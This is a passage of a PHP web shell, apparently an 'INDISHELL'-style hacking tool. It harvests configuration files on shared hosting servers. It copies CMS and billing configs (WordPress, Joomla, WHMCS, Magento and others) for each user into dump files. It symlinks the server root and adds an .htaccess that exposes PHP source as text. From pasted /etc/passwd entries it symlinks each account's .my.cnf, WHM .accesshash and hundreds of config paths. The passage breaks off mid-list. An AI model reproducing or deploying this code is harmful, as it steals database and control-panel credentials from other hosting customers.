							"$user_config_dir/whmcs/configuration.php" => "WHMCS",
							"$user_config_dir/forum/config.php" => "phpBB",
							"$user_config_dir/sites/default/settings.php" => "Drupal",
							"$user_config_dir/config/settings.inc.php" => "PrestaShop",
							"$user_config_dir/app/etc/local.xml" => "Magento",
							"$user_config_dir/joomla/configuration.php" => "Joomla",
							"$user_config_dir/configuration.php" => "Joomla",
							"$user_config_dir/wp/wp-config.php" => "WordPress",
							"$user_config_dir/wordpress/wp-config.php" => "WordPress",
							"$user_config_dir/wp-config.php" => "WordPress",
							"$user_config_dir/admin/config.php" => "OpenCart",
							"$user_config_dir/slconfig.php" => "Sitelok",
							"$user_config_dir/conf_global.php" => "conf_global",
							"$user_config_dir/inc/config.php" => "inc",
							"$user_config_dir/whm/configuration.php" => "whm",
							"$user_config_dir/whmcs/configuration.php" => "whmcs",
							"$user_config_dir/support/configuration.php" => "supporwhmcs",
							"$user_config_dir/whmc/WHM/configuration.php" => "WHM",
							"$user_config_dir/whm/WHMCS/configuration.php" => "whmc",
							"$user_config_dir/whm/whmcs/configuration.php" => "WHMcs",
							"$user_config_dir/support/configuration.php" => "whmcsupp",
							"$user_config_dir/clients/configuration.php" => "whmcs-cli",
							"$user_config_dir/client/configuration.php" => "whmcs-cl",
							"$user_config_dir/clientes/configuration.php" => "whmcs-CL",
							"$user_config_dir/cliente/configuration.php" => "whmcs-Cl",
							"$user_config_dir/clientsupport/configuration.php" => "whmcs-csup",
							"$user_config_dir/billing/configuration.php" => "whmcs-bill",
							"$user_config_dir/admin/config.php" => "admin-conf",
							"$user_config_dir/application/config/database.php" => "Ellislab",
							"$user_config_dir/ticket/include/ost-config.php" => "OST-Ticket",
							"$user_config_dir/supports/configuration.php" => "supports.txt",
							"$user_config_dir/requires/config.php" => "AM4SS-hosting.txt",
							"$user_config_dir/supports/includes/iso4217.php" => "hostbills-supports.txt",
							"$user_config_dir/client/includes/iso4217.php" => "hostbills-client.txt",
							"$user_config_dir/support/includes/iso4217.php" => "hostbills-support.txt",
							"$user_config_dir/billing/includes/iso4217.php" => "hostbills-billing.txt",
							"$user_config_dir/billings/includes/iso4217.php" => "hostbills-billings.txt",
							"$user_config_dir/host/includes/iso4217.php" => "hostbills-host.txt",
							"$user_config_dir/hosts/includes/iso4217.php" => "hostbills-hosts.txt",
							"$user_config_dir/hosting/includes/iso4217.php" => "hostbills-hosting.txt",
							"$user_config_dir/hostings/includes/iso4217.php" => "hostbills-hostings.txt",
							"$user_config_dir/includes/iso4217.php" => "hostbills.txt",
							"$user_config_dir/hostbillincludes/iso4217.php" => "hostbills-hostbills.txt",
							"$user_config_dir/includes/iso4217.php" => "hostbills-hostbill.txt",
							"$user_config_dir/include/ost-config.php" => "OST-Ticket");
							
							
						foreach($grab_config as $config => $nama_config) {
							$ambil_config = file_get_contents($config);
							if($ambil_config == '') {
							} else {
								$file_config = fopen("btm_conf/$user_idx-$nama_config.txt","w");
								fputs($file_config,$ambil_config);
							}
						}
					}		
				}
			}	
		}
	echo "<center><a href='?dir=$dir/btm_conf'><font color=lime>Done</font></a></center>";
	}
}
elseif($_GET['do'] == 'config2') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=config'>Config</a> </li>";	
echo "<li> <a href='?dir=$dir&do=config2'>2nd Config</a> </li>";	
echo "<li> <a href='?dir=$dir&do=indi'>INDISHELL</a> </li>";	
echo "<li> <a href='?dir=$dir&do=vgrab'>VHosts Grabber</a> </li>";
echo "</ul>";
echo "</center>";		
    if ($_POST["m"] && !$_POST["passwd"] == "") {
        echo "<center>Wait plz . . <br><br/>";
        $check = @ini_get("disable_functions");
        if (eregi("symlink", $check)) {
            die("<font color=red>Symlink is Disabled</font>");
        }
        @mkdir("btmgrab", 0777);
        @chdir("btmgrab");
        @symlink("/", "root");
        $htaccess = "
Options all
Options +Indexes
Options +FollowSymLinks
DirectoryIndex Sux.html
AddType text/plain .php
AddHandler server-parsed .php
AddType text/plain .html
AddHandler txt .html
Require None 
Satisfy Any
";
        file_put_contents(".htaccess", $htaccess, FILE_APPEND);
        $etc_passwd = $_POST["passwd"];
        $etc_passwd = explode("
", $etc_passwd);
        foreach ($etc_passwd as $passwd) {
            $pawd = explode(":", $passwd);
            $user = $pawd[0];
            @symlink('/home/' . $user . '/public_html/includes/configure.php', $user . '-shop.txt');
            @symlink('/home/' . $user . '/.my.cnf', $user . '-cpanel.txt');
            @symlink('/home/' . $user . '/.accesshash', $user . '-WHM-accesshash.txt');
            @symlink('/home/' . $user . '/public_html/os/includes/configure.php', $user . '-shop-os.txt');
            @symlink('/home/' . $user . '/public_html/oscom/includes/configure.php', $user . '-oscom.txt');
            @symlink('/home/' . $user . '/public_html/oscommerce/includes/configure.php', $user . '-oscommerce.txt');
            @symlink('/home/' . $user . '/public_html/oscommerces/includes/configure.php', $user . '-oscommerces.txt');
            @symlink('/home/' . $user . '/public_html/shop/includes/configure.php', $user . '-shop2.txt');
            @symlink('/home/' . $user . '/public_html/shopping/includes/configure.php', $user . '-shop-shopping.txt');
            @symlink('/home/' . $user . '/public_html/sale/includes/configure.php', $user . '-sale.txt');
            @symlink('/home/' . $user . '/public_html/amember/config.inc.php', $user . '-amember.txt');
            @symlink('/home/' . $user . '/public_html/config.inc.php', $user . '-amember2.txt');
            @symlink('/home/' . $user . '/public_html/members/configuration.php', $user . '-members.txt');
            @symlink('/home/' . $user . '/public_html/config.php', $user . '-4images1.txt');
            @symlink('/home/' . $user . '/public_html/forum/includes/config.php', $user . '-forum.txt');
            @symlink('/home/' . $user . '/public_html/forums/includes/config.php', $user . '-forums.txt');
            @symlink('/home/' . $user . '/public_html/admin/conf.php', $user . '-5.txt');
            @symlink('/home/' . $user . '/public_html/admin/config.php', $user . '-4.txt');
            @symlink('/home/' . $user . '/public_html/wp-config.php', $user . '-wp13.txt');
            @symlink('/home/' . $user . '/public_html/wp/wp-config.php', $user . '-wp13-wp.txt');
            @symlink('/home/' . $user . '/public_html/WP/wp-config.php', $user . '-wp13-WP.txt');
            @symlink('/home/' . $user . '/public_html/wp/beta/wp-config.php', $user . '-wp13-wp-beta.txt');
            @symlink('/home/' . $user . '/public_html/beta/wp-config.php', $user . '-wp13-beta.txt');
            @symlink('/home/' . $user . '/public_html/press/wp-config.php', $user . '-wp13-press.txt');
            @symlink('/home/' . $user . '/public_html/wordpress/wp-config.php', $user . '-wp13-wordpress.txt');
            @symlink('/home/' . $user . '/public_html/Wordpress/wp-config.php', $user . '-wp13-Wordpress.txt');
            @symlink('/home/' . $user . '/public_html/blog/wp-config.php', $user . '-wp13-Wordpress.txt');
            @symlink('/home/' . $user . '/public_html/wordpress/beta/wp-config.php', $user . '-wp13-wordpress-beta.txt');
            @symlink('/home/' . $user . '/public_html/news/wp-config.php', $user . '-wp13-news.txt');
            @symlink('/home/' . $user . '/public_html/new/wp-config.php', $user . '-wp13-new.txt');
            @symlink('/home/' . $user . '/public_html/blog/wp-config.php', $user . '-wp-blog.txt');
            @symlink('/home/' . $user . '/public_html/beta/wp-config.php', $user . '-wp-beta.txt');
            @symlink('/home/' . $user . '/public_html/blogs/wp-config.php', $user . '-wp-blogs.txt');
            @symlink('/home/' . $user . '/public_html/home/wp-config.php', $user . '-wp-home.txt');
            @symlink('/home/' . $user . '/public_html/protal/wp-config.php', $user . '-wp-protal.txt');
            @symlink('/home/' . $user . '/public_html/site/wp-config.php', $user . '-wp-site.txt');
            @symlink('/home/' . $user . '/public_html/main/wp-config.php', $user . '-wp-main.txt');
            @symlink('/home/' . $user . '/public_html/test/wp-config.php', $user . '-wp-test.txt');
            @symlink('/home/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
            @symlink('/home/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
            @symlink('/home/' . $user . '/public_html/joomla/configuration.php', $user . '-joomla2.txt');
            @symlink('/home/' . $user . '/public_html/protal/configuration.php', $user . '-joomla-protal.txt');
            @symlink('/home/' . $user . '/public_html/joo/configuration.php', $user . '-joo.txt');
            @symlink('/home/' . $user . '/public_html/cms/configuration.php', $user . '-joomla-cms.txt');
            @symlink('/home/' . $user . '/public_html/site/configuration.php', $user . '-joomla-site.txt');
            @symlink('/home/' . $user . '/public_html/main/configuration.php', $user . '-joomla-main.txt');
            @symlink('/home/' . $user . '/public_html/news/configuration.php', $user . '-joomla-news.txt');
            @symlink('/home/' . $user . '/public_html/new/configuration.php', $user . '-joomla-new.txt');
            @symlink('/home/' . $user . '/public_html/home/configuration.php', $user . '-joomla-home.txt');
            @symlink('/home/' . $user . '/public_html/vb/includes/config.php', $user . '-vb-config.txt');
            @symlink('/home/' . $user . '/public_html/vb3/includes/config.php', $user . '-vb3-config.txt');
            @symlink('/home/' . $user . '/public_html/cc/includes/config.php', $user . '-vb1-config.txt');
            @symlink('/home/' . $user . '/public_html/includes/config.php', $user . '-includes-vb.txt');
            @symlink('/home/' . $user . '/public_html/forum/includes/class_core.php', $user . '-vbluttin-class_core.php.txt');
            @symlink('/home/' . $user . '/public_html/vb/includes/class_core.php', $user . '-vbluttin-class_core.php1.txt');
            @symlink('/home/' . $user . '/public_html/cc/includes/class_core.php', $user . '-vbluttin-class_core.php2.txt');
            @symlink('/home/' . $user . '/public_html/configuration.php', $user . '-joomla.txt');
            @symlink('/home/' . $user . '/public_html/includes/dist-configure.php', $user . '-zencart.txt');
            @symlink('/home/' . $user . '/public_html/zencart/includes/dist-configure.php', $user . '-shop-zencart.txt');
            @symlink('/home/' . $user . '/public_html/shop/includes/dist-configure.php', $user . '-shop-ZCshop.txt');
            @symlink('/home/' . $user . '/public_html/Settings.php', $user . '-smf.txt');
            @symlink('/home/' . $user . '/public_html/smf/Settings.php', $user . '-smf2.txt');
            @symlink('/home/' . $user . '/public_html/forum/Settings.php', $user . '-smf-forum.txt');
            @symlink('/home/' . $user . '/public_html/forums/Settings.php', $user . '-smf-forums.txt');
            @symlink('/home/' . $user . '/public_html/upload/includes/config.php', $user . '-up.txt');
            @symlink('/home/' . $user . '/public_html/article/config.php', $user . '-Nwahy.txt');
            @symlink('/home/' . $user . '/public_html/up/includes/config.php', $user . '-up2.txt');
            @symlink('/home/' . $user . '/public_html/conf_global.php', $user . '-6.txt');
            @symlink('/home/' . $user . '/public_html/include/db.php', $user . '-7.txt');
            @symlink('/home/' . $user . '/public_html/connect.php', $user . '-PHP-Fusion.txt');
            @symlink('/home/' . $user . '/public_html/mk_conf.php', $user . '-9.txt');
            @symlink('/home/' . $user . '/public_html/includes/config.php', $user . '-traidnt1.txt');
            @symlink('/home/' . $user . '/public_html/config.php', $user . '-4images.txt');
            @symlink('/home/' . $user . '/public_html/sites/default/settings.php', $user . '-Drupal.txt');
            @symlink('/home/' . $user . '/public_html/member/configuration.php', $user . '-1member.txt');
            @symlink('/home/' . $user . '/public_html/supports/includes/iso4217.php', $user . '-hostbills-supports.txt');
            @symlink('/home/' . $user . '/public_html/client/includes/iso4217.php', $user . '-hostbills-client.txt');
            @symlink('/home/' . $user . '/public_html/support/includes/iso4217.php', $user . '-hostbills-support.txt');
            @symlink('/home/' . $user . '/public_html/billing/includes/iso4217.php', $user . '-hostbills-billing.txt');
            @symlink('/home/' . $user . '/public_html/billings/includes/iso4217.php', $user . '-hostbills-billings.txt');
            @symlink('/home/' . $user . '/public_html/host/includes/iso4217.php', $user . '-hostbills-host.txt');
            @symlink('/home/' . $user . '/public_html/hosts/includes/iso4217.php', $user . '-hostbills-hosts.txt');
            @symlink('/home/' . $user . '/public_html/hosting/includes/iso4217.php', $user . '-hostbills-hosting.txt');
            @symlink('/home/' . $user . '/public_html/hostings/includes/iso4217.php', $user . '-hostbills-hostings.txt');
            @symlink('/home/' . $user . '/public_html/includes/iso4217.php', $user . '-hostbills.txt');
            @symlink('/home/' . $user . '/public_html/hostbills/includes/iso4217.php', $user . '-hostbills-hostbills.txt');
            @symlink('/home/' . $user . '/public_html/hostbill/includes/iso4217.php', $user . '-hostbills-hostbill.txt');
            @symlink('/home/' . $user . '/public_html/cart/configuration.php', $user . '-cart-WHMCS.txt');
            @symlink('/home/' . $user . '/public_html/hosting/configuration.php', $user . '-hosting-WHMCS.txt');
            @symlink('/home/' . $user . '/public_html/buy/configuration.php', $user . '-buy-WHMCS.txt');
            @symlink('/home/' . $user . '/public_html/checkout/configuration.php', $user . '-checkout-WHMCS.txt');
            @symlink('/home/' . $user . '/public_html/host/configuration.php', $user . '-host-WHMCS.txt');
            @symlink('/home/' . $user . '/public_html/shop/configuration.php', $user . '-shop-WHMCS.txt');
            @symlink('/home/' . $user . '/public_html/shopping/configuration.php', $user . '-shopping-WHMCS.txt');
            @symlink('/home/' . $user . '/public_html/sale/configuration.php', $user . '-sale-WHMCS.txt');
            @symlink('/home/' . $user . '/public_html/client/configuration.php', $user . '-client-WHMCS.txt');
            @symlink('/home/' . $user . '/public_html/support/configuration.php', $user . '-support-WHMCS.txt');
            @symlink('/home/' . $user . '/public_html/clientsupport/configuration.php', $user . '-clientsupport-WHMCS.txt');
            @symlink('/home/' . $user . '/public_html/whm/whmcs/configuration.php', $user . '-whm-whmcs.txt');
            @symlink('/home/' . $user . '/public_html/whm/WHMCS/configuration.php', $user . '-whm-WHMCS.txt');
            @symlink('/home/' . $user . '/public_html/whmc/WHM/configuration.php', $user . '-whmc-WHM.txt');
            @symlink('/home/' . $user . '/public_html/whmcs/configuration.php', $user . '-whmc-WHMCS.txt');
            @symlink('/home/' . $user . '/public_html/supp/configuration.php', $user . '-supp-WHMCS.txt');
            @symlink('/home/' . $user . '/public_html/secure/configuration.php', $user . '-sucure-WHMCS.txt');
            @symlink('/home/' . $user . '/public_html/secure/whm/configuration.php', $user . '-sucure-whm-WHMCS.txt');
            @symlink('/home/' . $user . '/public_html/secure/whmcs/configuration.php', $user . '-sucure-whmcs-WHMCS.txt');
            @symlink('/home/' . $user . '/public_html/panel/configuration.php', $user . '-panel-WHMCS.txt');
            @symlink('/home/' . $user . '/public_html/hosts/configuration.php', $user . '-hosts-WHMCS.txt');
            @symlink('/home/' . $user . '/public_html/submitticket.php', $user . '-submitticket-WHMCS.txt');
            @symlink('/home/' . $user . '/public_html/clients/configuration.php', $user . '-clients-WHMCS.txt');
            @symlink('/home/' . $user . '/public_html/clientes/configuration.php', $user . '-clientes-WHMCS.txt');
            @symlink('/home/' . $user . '/public_html/cliente/configuration.php', $user . '-client-WHMCS.txt');
            @symlink('/home/' . $user . '/public_html/billing/configuration.php', $user . '-billing-WHMCS.txt');
            @symlink('/home/' . $user . '/public_html/manage/configuration.php', $user . '-whm-manage-WHMCS.txt');
            @symlink('/home/' . $user . '/public_html/my/configuration.php', $user . '-whm-my-WHMCS.txt');
            @symlink('/home/' . $user . '/public_html/myshop/configuration.php', $user . '-whm-myshop-WHMCS.txt');
            @symlink('/home/' . $user . '/public_html/billings/configuration.php', $user . '-billings-WHMCS.txt');
            @symlink('/home/' . $user . '/public_html/supports/configuration.php', $user . '-supports-WHMCS.txt');
            @symlink('/home/' . $user . '/public_html/auto/configuration.php', $user . '-auto-WHMCS.txt');
            @symlink('/home/' . $user . '/public_html/go/configuration.php', $user . '-go-WHMCS.txt');
            @symlink('/home/' . $user . '/public_html/' . $user . '/configuration.php', $user . '-USERNAME-WHMCS.txt');
            @symlink('/home/' . $user . '/public_html/bill/configuration.php', $user . '-bill-WHMCS.txt');
            @symlink('/home/' . $user . '/public_html/payment/configuration.php', $user . '-payment-WHMCS.txt');
            @symlink('/home/' . $user . '/public_html/pay/configuration.php', $user . '-pay-WHMCS.txt');
            @symlink('/home/' . $user . '/public_html/purchase/configuration.php', $user . '-purchase-WHMCS.txt');
            @symlink('/home/' . $user . '/public_html/clientarea/configuration.php', $user . '-clientarea-WHMCS.txt');
            @symlink('/home/' . $user . '/public_html/autobuy/configuration.php', $user . '-autobuy-WHMCS.txt');
            @symlink('/home2/' . $user . '/.my.cnf', $user . '-cpanel.txt');
            @symlink('/home2/' . $user . '/.accesshash', $user . '-WHM-accesshash.txt');
            @symlink('/home2/' . $user . '/public_html/includes/configure.php', $user . '-shop.txt');
            @symlink('/home2/' . $user . '/public_html/os/includes/configure.php', $user . '-shop-os.txt');
            @symlink('/home2/' . $user . '/public_html/oscom/includes/configure.php', $user . '-oscom.txt');
            @symlink('/home2/' . $user . '/public_html/oscommerce/includes/configure.php', $user . '-oscommerce.txt');
            @symlink('/home2/' . $user . '/public_html/oscommerces/includes/configure.php', $user . '-oscommerces.txt');
            @symlink('/home2/' . $user . '/public_html/shop/includes/configure.php', $user . '-shop2.txt');
            @symlink('/home2/' . $user . '/public_html/shopping/includes/configure.php', $user . '-shop-shopping.txt');
            @symlink('/home2/' . $user . '/public_html/sale/includes/configure.php', $user . '-sale.txt');
            @symlink('/home2/' . $user . '/public_html/amember/config.inc.php', $user . '-amember.txt');
            @symlink('/home2/' . $user . '/public_html/config.inc.php', $user . '-amember2.txt');
            @symlink('/home2/' . $user . '/public_html/members/configuration.php', $user . '-members.txt');
            @symlink('/home2/' . $user . '/public_html/config.php', $user . '-4images1.txt');
            @symlink('/home2/' . $user . '/public_html/forum/includes/config.php', $user . '-forum.txt');
            @symlink('/home2/' . $user . '/public_html/forums/includes/config.php', $user . '-forums.txt');
            @symlink('/home2/' . $user . '/public_html/admin/conf.php', $user . '-5.txt');
            @symlink('/home2/' . $user . '/public_html/admin/config.php', $user . '-4.txt');
            @symlink('/home2/' . $user . '/public_html/wp-config.php', $user . '-wp13.txt');
            @symlink('/home2/' . $user . '/public_html/wp/wp-config.php', $user . '-wp13-wp.txt');
            @symlink('/home2/' . $user . '/public_html/WP/wp-config.php', $user . '-wp13-WP.txt');
            @symlink('/home2/' . $user . '/public_html/wp/beta/wp-config.php', $user . '-wp13-wp-beta.txt');
            @symlink('/home2/' . $user . '/public_html/beta/wp-config.php', $user . '-wp13-beta.txt');
            @symlink('/home2/' . $user . '/public_html/press/wp-config.php', $user . '-wp13-press.txt');
            @symlink('/home2/' . $user . '/public_html/wordpress/wp-config.php', $user . '-wp13-wordpress.txt');
            @symlink('/home2/' . $user . '/public_html/Wordpress/wp-config.php', $user . '-wp13-Wordpress.txt');
            @symlink('/home2/' . $user . '/public_html/blog/wp-config.php', $user . '-wp13-Wordpress.txt');
            @symlink('/home2/' . $user . '/public_html/wordpress/beta/wp-config.php', $user . '-wp13-wordpress-beta.txt');
            @symlink('/home2/' . $user . '/public_html/news/wp-config.php', $user . '-wp13-news.txt');
            @symlink('/home2/' . $user . '/public_html/new/wp-config.php', $user . '-wp13-new.txt');
            @symlink('/home2/' . $user . '/public_html/blog/wp-config.php', $user . '-wp-blog.txt');
            @symlink('/home2/' . $user . '/public_html/beta/wp-config.php', $user . '-wp-beta.txt');
            @symlink('/home2/' . $user . '/public_html/blogs/wp-config.php', $user . '-wp-blogs.txt');
            @symlink('/home2/' . $user . '/public_html/home2/wp-config.php', $user . '-wp-home2.txt');
            @symlink('/home2/' . $user . '/public_html/protal/wp-config.php', $user . '-wp-protal.txt');
            @symlink('/home2/' . $user . '/public_html/site/wp-config.php', $user . '-wp-site.txt');
            @symlink('/home2/' . $user . '/public_html/main/wp-config.php', $user . '-wp-main.txt');
            @symlink('/home2/' . $user . '/public_html/test/wp-config.php', $user . '-wp-test.txt');
            @symlink('/home2/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
            @symlink('/home2/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
            @symlink('/home2/' . $user . '/public_html/joomla/configuration.php', $user . '-joomla2.txt');
            @symlink('/home2/' . $user . '/public_html/protal/configuration.php', $user . '-joomla-protal.txt');
            @symlink('/home2/' . $user . '/public_html/joo/configuration.php', $user . '-joo.txt');
            @symlink('/home2/' . $user . '/public_html/cms/configuration.php', $user . '-joomla-cms.txt');
            @symlink('/home2/' . $user . '/public_html/site/configuration.php', $user . '-joomla-site.txt');
            @symlink('/home2/' . $user . '/public_html/main/configuration.php', $user . '-joomla-main.txt');
            @symlink('/home2/' . $user . '/public_html/news/configuration.php', $user . '-joomla-news.txt');
            @symlink('/home2/' . $user . '/public_html/new/configuration.php', $user . '-joomla-new.txt');
            @symlink('/home2/' . $user . '/public_html/home2/configuration.php', $user . '-joomla-home2.txt');
            @symlink('/home2/' . $user . '/public_html/vb/includes/config.php', $user . '-vb-config.txt');
            @symlink('/home2/' . $user . '/public_html/vb3/includes/config.php', $user . '-vb3-config.txt');
            @symlink('/home2/' . $user . '/public_html/cc/includes/config.php', $user . '-vb1-config.txt');
            @symlink('/home2/' . $user . '/public_html/includes/config.php', $user . '-includes-vb.txt');
            @symlink('/home2/' . $user . '/public_html/forum/includes/class_core.php', $user . '-vbluttin-class_core.php.txt');
            @symlink('/home2/' . $user . '/public_html/vb/includes/class_core.php', $user . '-vbluttin-class_core.php1.txt');
            @symlink('/home2/' . $user . '/public_html/cc/includes/class_core.php', $user . '-vbluttin-class_core.php2.txt');
            @symlink('/home2/' . $user . '/public_html/configuration.php', $user . '-joomla.txt');
            @symlink('/home2/' . $user . '/public_html/includes/dist-configure.php', $user . '-zencart.txt');
            @symlink('/home2/' . $user . '/public_html/zencart/includes/dist-configure.php', $user . '-shop-zencart.txt');
            @symlink('/home2/' . $user . '/public_html/shop/includes/dist-configure.php', $user . '-shop-ZCshop.txt');
            @symlink('/home2/' . $user . '/public_html/Settings.php', $user . '-smf.txt');
            @symlink('/home2/' . $user . '/public_html/smf/Settings.php', $user . '-smf2.txt');
            @symlink('/home2/' . $user . '/public_html/forum/Settings.php', $user . '-smf-forum.txt');
            @symlink('/home2/' . $user . '/public_html/forums/Settings.php', $user . '-smf-forums.txt');
            @symlink('/home2/' . $user . '/public_html/upload/includes/config.php', $user . '-up.txt');
            @symlink('/home2/' . $user . '/public_html/article/config.php', $user . '-Nwahy.txt');
            @symlink('/home2/' . $user . '/public_html/up/includes/config.php', $user . '-up2.txt');
            @symlink('/home2/' . $user . '/public_html/conf_global.php', $user . '-6.txt');
            @symlink('/home2/' . $user . '/public_html/include/db.php', $user . '-7.txt');
            @symlink('/home2/' . $user . '/public_html/connect.php', $user . '-PHP-Fusion.txt');
            @symlink('/home2/' . $user . '/public_html/mk_conf.php', $user . '-9.txt');
            @symlink('/home2/' . $user . '/public_html/includes/config.php', $user . '-traidnt1.txt');
            @symlink('/home2/' . $user . '/public_html/config.php', $user . '-4images.txt');
            @symlink('/home2/' . $user . '/public_html/sites/default/settings.php', $user . '-Drupal.txt');
            @symlink('/home2/' . $user . '/public_html/member/configuration.php', $user . '-1member.txt');
            @symlink('/home2/' . $user . '/public_html/supports/includes/iso4217.php', $user . '-hostbills-supports.txt');
            @symlink('/home2/' . $user . '/public_html/client/includes/iso4217.php', $user . '-hostbills-client.txt');
            @symlink('/home2/' . $user . '/public_html/support/includes/iso4217.php', $user . '-hostbills-support.txt');
            @symlink('/home2/' . $user . '/public_html/billing/includes/iso4217.php', $user . '-hostbills-billing.txt');
            @symlink('/home2/' . $user . '/public_html/billings/includes/iso4217.php', $user . '-hostbills-billings.txt');
            @symlink('/home2/' . $user . '/public_html/host/includes/iso4217.php', $user . '-hostbills-host.txt');
            @symlink('/home2/' . $user . '/public_html/hosts/includes/iso4217.php', $user . '-hostbills-hosts.txt');
            @symlink('/home2/' . $user . '/public_html/hosting/includes/iso4217.php', $user . '-hostbills-hosting.txt');
            @symlink('/home2/' . $user . '/public_html/hostings/includes/iso4217.php', $user . '-hostbills-hostings.txt');
            @symlink('/home2/' . $user . '/public_html/includes/iso4217.php', $user . '-hostbills.txt');
            @symlink('/home2/' . $user . '/public_html/hostbills/includes/iso4217.php', $user . '-hostbills-hostbills.txt');
            @symlink('/home2/' . $user . '/public_html/hostbill/includes/iso4217.php', $user . '-hostbills-hostbill.txt');
            @symlink('/home2/' . $user . '/public_html/cart/configuration.php', $user . '-cart-WHMCS.txt');
            @symlink('/home2/' . $user . '/public_html/hosting/configuration.php', $user . '-hosting-WHMCS.txt');
            @symlink('/home2/' . $user . '/public_html/buy/configuration.php', $user . '-buy-WHMCS.txt');
            @symlink('/home2/' . $user . '/public_html/checkout/configuration.php', $user . '-checkout-WHMCS.txt');
            @symlink('/home2/' . $user . '/public_html/host/configuration.php', $user . '-host-WHMCS.txt');
            @symlink('/home2/' . $user . '/public_html/shop/configuration.php', $user . '-shop-WHMCS.txt');
            @symlink('/home2/' . $user . '/public_html/shopping/configuration.php', $user . '-shopping-WHMCS.txt');
            @symlink('/home2/' . $user . '/public_html/sale/configuration.php', $user . '-sale-WHMCS.txt');
            @symlink('/home2/' . $user . '/public_html/client/configuration.php', $user . '-client-WHMCS.txt');
            @symlink('/home2/' . $user . '/public_html/support/configuration.php', $user . '-support-WHMCS.txt');
            @symlink('/home2/' . $user . '/public_html/clientsupport/configuration.php', $user . '-clientsupport-WHMCS.txt');
            @symlink('/home2/' . $user . '/public_html/whm/whmcs/configuration.php', $user . '-whm-whmcs.txt');
            @symlink('/home2/' . $user . '/public_html/whm/WHMCS/configuration.php', $user . '-whm-WHMCS.txt');
            @symlink('/home2/' . $user . '/public_html/whmc/WHM/configuration.php', $user . '-whmc-WHM.txt');
            @symlink('/home2/' . $user . '/public_html/whmcs/configuration.php', $user . '-whmc-WHMCS.txt');
            @symlink('/home2/' . $user . '/public_html/supp/configuration.php', $user . '-supp-WHMCS.txt');
            @symlink('/home2/' . $user . '/public_html/secure/configuration.php', $user . '-sucure-WHMCS.txt');
            @symlink('/home2/' . $user . '/public_html/secure/whm/configuration.php', $user . '-sucure-whm-WHMCS.txt');
            @symlink('/home2/' . $user . '/public_html/secure/whmcs/configuration.php', $user . '-sucure-whmcs-WHMCS.txt');
            @symlink('/home2/' . $user . '/public_html/panel/configuration.php', $user . '-panel-WHMCS.txt');
            @symlink('/home2/' . $user . '/public_html/hosts/configuration.php', $user . '-hosts-WHMCS.txt');
            @symlink('/home2/' . $user . '/public_html/submitticket.php', $user . '-submitticket-WHMCS.txt');
            @symlink('/home2/' . $user . '/public_html/clients/configuration.php', $user . '-clients-WHMCS.txt');
            @symlink('/home2/' . $user . '/public_html/clientes/configuration.php', $user . '-clientes-WHMCS.txt');
            @symlink('/home2/' . $user . '/public_html/cliente/configuration.php', $user . '-client-WHMCS.txt');
            @symlink('/home2/' . $user . '/public_html/billing/configuration.php', $user . '-billing-WHMCS.txt');
            @symlink('/home2/' . $user . '/public_html/manage/configuration.php', $user . '-whm-manage-WHMCS.txt');
            @symlink('/home2/' . $user . '/public_html/my/configuration.php', $user . '-whm-my-WHMCS.txt');
            @symlink('/home2/' . $user . '/public_html/myshop/configuration.php', $user . '-whm-myshop-WHMCS.txt');
            @symlink('/home2/' . $user . '/public_html/billings/configuration.php', $user . '-billings-WHMCS.txt');
            @symlink('/home2/' . $user . '/public_html/supports/configuration.php', $user . '-supports-WHMCS.txt');
            @symlink('/home2/' . $user . '/public_html/auto/configuration.php', $user . '-auto-WHMCS.txt');
            @symlink('/home2/' . $user . '/public_html/go/configuration.php', $user . '-go-WHMCS.txt');
            @symlink('/home2/' . $user . '/public_html/' . $user . '/configuration.php', $user . '-USERNAME-WHMCS.txt');
            @symlink('/home2/' . $user . '/public_html/bill/configuration.php', $user . '-bill-WHMCS.txt');
            @symlink('/home2/' . $user . '/public_html/payment/configuration.php', $user . '-payment-WHMCS.txt');
            @symlink('/home2/' . $user . '/public_html/pay/configuration.php', $user . '-pay-WHMCS.txt');
            @symlink('/home2/' . $user . '/public_html/purchase/configuration.php', $user . '-purchase-WHMCS.txt');
            @symlink('/home2/' . $user . '/public_html/clientarea/configuration.php', $user . '-clientarea-WHMCS.txt');
            @symlink('/home2/' . $user . '/public_html/autobuy/configuration.php', $user . '-autobuy-WHMCS.txt');
            @symlink('/home3/' . $user . '/.my.cnf', $user . '-cpanel.txt');
            @symlink('/home3/' . $user . '/.accesshash', $user . '-WHM-accesshash.txt');
			@symlink('/home3/' . $user . '/public_html/includes/configure.php', $user . '-shop.txt');
            @symlink('/home3/' . $user . '/public_html/os/includes/configure.php', $user . '-shop-os.txt');
            @symlink('/home3/' . $user . '/public_html/oscom/includes/configure.php', $user . '-oscom.txt');
            @symlink('/home3/' . $user . '/public_html/oscommerce/includes/configure.php', $user . '-oscommerce.txt');
            @symlink('/home3/' . $user . '/public_html/oscommerces/includes/configure.php', $user . '-oscommerces.txt');
            @symlink('/home3/' . $user . '/public_html/shop/includes/configure.php', $user . '-shop2.txt');
            @symlink('/home3/' . $user . '/public_html/shopping/includes/configure.php', $user . '-shop-shopping.txt');
            @symlink('/home3/' . $user . '/public_html/sale/includes/configure.php', $user . '-sale.txt');
            @symlink('/home3/' . $user . '/public_html/amember/config.inc.php', $user . '-amember.txt');
            @symlink('/home3/' . $user . '/public_html/config.inc.php', $user . '-amember2.txt');
            @symlink('/home3/' . $user . '/public_html/members/configuration.php', $user . '-members.txt');
            @symlink('/home3/' . $user . '/public_html/config.php', $user . '-4images1.txt');
            @symlink('/home3/' . $user . '/public_html/forum/includes/config.php', $user . '-forum.txt');
            @symlink('/home3/' . $user . '/public_html/forums/includes/config.php', $user . '-forums.txt');
            @symlink('/home3/' . $user . '/public_html/admin/conf.php', $user . '-5.txt');
            @symlink('/home3/' . $user . '/public_html/admin/config.php', $user . '-4.txt');
            @symlink('/home3/' . $user . '/public_html/wp-config.php', $user . '-wp13.txt');
            @symlink('/home3/' . $user . '/public_html/wp/wp-config.php', $user . '-wp13-wp.txt');
            @symlink('/home3/' . $user . '/public_html/WP/wp-config.php', $user . '-wp13-WP.txt');
            @symlink('/home3/' . $user . '/public_html/wp/beta/wp-config.php', $user . '-wp13-wp-beta.txt');
